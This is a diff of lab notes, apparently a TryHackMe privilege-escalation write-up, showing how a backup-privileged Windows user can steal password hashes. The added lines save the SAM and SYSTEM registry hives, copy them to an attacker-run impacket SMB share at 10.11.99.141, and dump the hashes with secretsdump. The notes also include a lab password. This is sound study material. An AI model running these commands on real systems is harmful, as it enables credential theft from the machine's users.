@@ -258,11 +258,14 @@ whoami /priv
 1️⃣ To backup the SAM and SYSTEM hashes, and Extraction of SAM and System Registry Files  
 reg save hklm\system C:\Users\THMBackup\system.hive
 reg save hklm\sam C:\Users\THMBackup\sam.hive
-2️⃣ Transfer the extracted files to the invading system, To send these files to the Kali Linux system, we use SMB Server with impacket Tools  .
+2️⃣ Launch a SMB Server in the hacker system (Kali Linux) with impacket smbserver tools for Transfer the extracted files to the hacker system
 mkdir share
-sudo python /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
-
-
+sudo python /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share 
+3️⃣ Transfer files from Windows to Linux
+copy C:\Users\THMBackup\sam.hive \\10.11.99.141\public\
+copy C:\Users\THMBackup\system.hive \\10.11.99.141\public\
+4️⃣ Extraction of password hashs from registry files with impacket secretsdump tools
+sudo python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
 
 
 ## Credentials ✅
